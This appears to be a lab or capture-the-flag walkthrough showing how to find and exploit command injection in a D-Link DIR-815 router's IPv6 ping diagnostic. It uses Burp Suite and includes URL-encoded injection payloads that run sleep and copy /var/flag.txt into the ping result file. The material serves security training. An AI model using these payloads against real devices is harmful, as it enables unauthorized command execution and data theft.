+++
title = "Command Injection"
date = 2021-10-18T20:39:54-06:00
weight = 3
+++


The DIR 815 is vulnerable to command injection once authenticated. Make sure you found the password from the previous steps.

## Open Burpsuite

For this step, we will use Burpsuite.

Click the Kali drop down in the top left corner and search for `Burp`.

![images/kali-burp.png](/static/kali-find-burp.png)

- Open Burp. This may take a few seconds.
- Click `Next`
- Click `Start Burp`

Navigate to "Proxy" > "Intercept" tab and turn off Intercept.

![images/burp_nav_to_proxy.png](/static/burp_nav_to_proxy.png)

## Open the Burpsuite Browser

In Burpsuite, click on the open Browser button. This will automatically proxy calls through Burpsuite.

![images//burpsuite_browser_button.png](/static/burpsuite_browser_button.png)

In the broswer, navigate to `http://172.21.0.23:8080/`.

Now in Burpsuite. Navigate to the "Proxy" > "HTTP History" tab. You should see the traffic from loading the login page.

![images/burp_http_history.png](/static/burp_http_history.png)

## Use the Ping Utility

In the browser, log into the DLINK router using the creds discovered from out brute force attack.

Then navigate to `Tools` > `System Check`:

![images/dir815_tools_system_check.png](/static/dir815_tools_system_check.png)

Try using the IPv6 ping utility.

![images/dir815_ipv6_ping.png](/static/dir815_ipv6_ping.png)

Send the request to the repeater tab.

![images/dir815_send_to_repeater.png](/static/dir815_send_to_repeater.png)

We can see that the POST request body contains what look like shell commands to run ping.

![images/dir815_repeater1.png](/static/dir815_repeater1.png)

## Test for Command Injection

You can rerun the command a few times and see that it quickly resolves. We can test for command injection by using the `sleep` command. We don't need to get any data back, but if the command takes longer to return, then we know that the `sleep` command is being evaluated. Try changing the body of the request to the following and sending.

We want to try to get the router to evaluate the following command:
> ping6 ::1 && sleep 2

But it will need to be URL encoded. We can use Cyberchef to encode this. Click <a href="https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&input=JiYgc2xlZXAgMg"> here</a>

![images/cyberchef_url_encode_sleep.png](/static/cyberchef_url_encode_sleep.png)

Once we have our command encoded, place it in our request in Burpsuite.
```
act=ping6&dst=::1%26%26%20sleep%202
```
![images/burp_sleep_command.png](/static/burp_sleep_command.png)

We should see that the request takes 2 seconds to return, implying we have command injection.

## Examining the Code

We know that the DLINK router is running firmware version 2.01. We've pulled the firmware and extracted the file system and found the code that is used for the `ping` diagnostic utility.We can notice the ping IPv4 is doing more than for IPv6. The IPv4 ping utility is not vulnerable to the same vector that we just tested.

![images/diagnostic_php.png](/static/diagnostic_php.png)

Another script used with the ping utility shows which file the results are written and read from.

![images/ping-utli_sh.png](/static/ping-util_sh.png)


## Exploiting Command Injection to Read Files.

We want to inject the command to copy the contents of `flag.txt` to the file that is read for the ping results:

> cat /var/flag.txt > /var/ping_result

We need to URL encode the payload again. You can do that with Cyberchef <a href="https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&input=JiYgY2F0IC92YXIvZmxhZy50eHQgPiAvdmFyL3BpbmdfcmVzdWx0">here</a>.

Copy and use the payload in Burp repeater.
```
act=ping6&dst=::1%26%26%20cat%20%2Fvar%2Fflag%2Etxt%20%3E%20%2Fvar%2Fping%5Fresult
```
![images/burp_command_injection.png](/static/burp_command_injection.png)

You should get the contents of `/var/flag.txt` in the response.
